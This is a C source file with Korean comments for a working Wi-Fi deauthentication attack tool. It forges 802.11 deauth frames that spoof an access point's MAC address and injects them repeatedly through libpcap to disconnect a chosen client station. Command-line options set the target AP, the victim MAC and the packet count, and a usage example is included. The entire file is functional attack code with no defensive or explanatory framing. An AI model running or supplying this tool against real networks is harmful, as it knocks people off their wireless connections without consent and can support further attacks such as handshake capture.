#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <unistd.h>
#include <arpa/inet.h>

// IEEE 802.11 MAC Address Length
#define ETHER_ADDR_LEN 6
#define PACKET_COUNT 100  // 기본 패킷 전송 횟수

// 802.11 Deauthentication Packet 구조체
struct ieee80211_deauth_packet {
    u_short frame_control;
    u_short duration_id;
    u_char dest_addr[ETHER_ADDR_LEN];
    u_char source_addr[ETHER_ADDR_LEN];
    u_char bssid[ETHER_ADDR_LEN];
    u_short seq_control;
    u_short reason_code;
};

// Radiotap Header (Static)
static const uint8_t radiotap_header[] = {
    0x00, 0x00, 0x19, 0x00, 0x6f, 0x08, 0x00, 0x00,
    0x11, 0x13, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x10, 0x02, 0x6c, 0x09, 0x80, 0x04, 0xed, 0xa9, 0x00
};

// MAC 주소 변환 (문자열 "AA:BB:CC:DD:EE:FF" → 바이트 배열)
void convert_mac_string(const char *input, uint8_t *mac) {
    sscanf(input, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

// Deauth 패킷 생성
void create_deauth_packet(struct ieee80211_deauth_packet *packet, const uint8_t *ap_mac, const uint8_t *station_mac) {
    memset(packet, 0, sizeof(struct ieee80211_deauth_packet));

    packet->frame_control = htons(0x00C0);  // Deauthentication Frame (0xC0)
    packet->duration_id = htons(0x013A);    // Duration
    packet->seq_control = htons(0x0000);    // Sequence Number
    packet->reason_code = htons(0x0007);    // Reason Code (Class 3 frame received from nonassociated STA)

    memcpy(packet->dest_addr, station_mac, ETHER_ADDR_LEN);
    memcpy(packet->source_addr, ap_mac, ETHER_ADDR_LEN);
    memcpy(packet->bssid, ap_mac, ETHER_ADDR_LEN);
}

// WiFi Deauth 패킷 전송 함수
void send_deauth_packets(pcap_t *handle, struct ieee80211_deauth_packet *packet, int count) {
    uint8_t buffer[sizeof(radiotap_header) + sizeof(struct ieee80211_deauth_packet)];
    memcpy(buffer, radiotap_header, sizeof(radiotap_header));
    memcpy(buffer + sizeof(radiotap_header), packet, sizeof(struct ieee80211_deauth_packet));

    printf("\n[+] Sending Deauthentication packets...\n");

    for (int i = 0; i < count; i++) {
        if (pcap_sendpacket(handle, buffer, sizeof(buffer)) != 0) {
            fprintf(stderr, "[-] Error sending packet: %s\n", pcap_geterr(handle));
        } else {
            printf("[+] Packet %d sent\n", i + 1);
        }
        usleep(50000);  // 50ms 대기
    }

    printf("\n[+] All packets have been sent successfully.\n");
}

int main(int argc, char *argv[]) {
    char interface[50] = {0};
    uint8_t ap_mac[ETHER_ADDR_LEN] = {0};
    uint8_t station_mac[ETHER_ADDR_LEN] = {0};
    int packet_count = PACKET_COUNT;

    // 명령줄 옵션 처리
    int opt;
    while ((opt = getopt(argc, argv, "i:a:c:n:h")) != -1) {
        switch (opt) {
            case 'i':
                strncpy(interface, optarg, sizeof(interface) - 1);
                break;
            case 'a':
                convert_mac_string(optarg, ap_mac);
                break;
            case 'c':
                convert_mac_string(optarg, station_mac);
                break;
            case 'n':
                packet_count = atoi(optarg);
                break;
            case 'h':
            default:
                printf("\nUsage: %s -i <interface> -a <AP MAC> -c <Station MAC> -n <packets>\n", argv[0]);
                printf("Example: %s -i wlan0mon -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB -n 100\n", argv[0]);
                return 0;
        }
    }

    // 필수 옵션 확인
    if (strlen(interface) == 0 || memcmp(ap_mac, (uint8_t[6]){0}, 6) == 0 || memcmp(station_mac, (uint8_t[6]){0}, 6) == 0) {
        fprintf(stderr, "[-] Missing required arguments. Use -h for help.\n");
        return 1;
    }

    // pcap 핸들 열기
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "[-] Could not open device %s: %s\n", interface, errbuf);
        return 1;
    }

    // Deauth 패킷 생성 및 전송
    struct ieee80211_deauth_packet packet;
    create_deauth_packet(&packet, ap_mac, station_mac);
    send_deauth_packets(handle, &packet, packet_count);

    // pcap 종료
    pcap_close(handle);
    return 0;
}
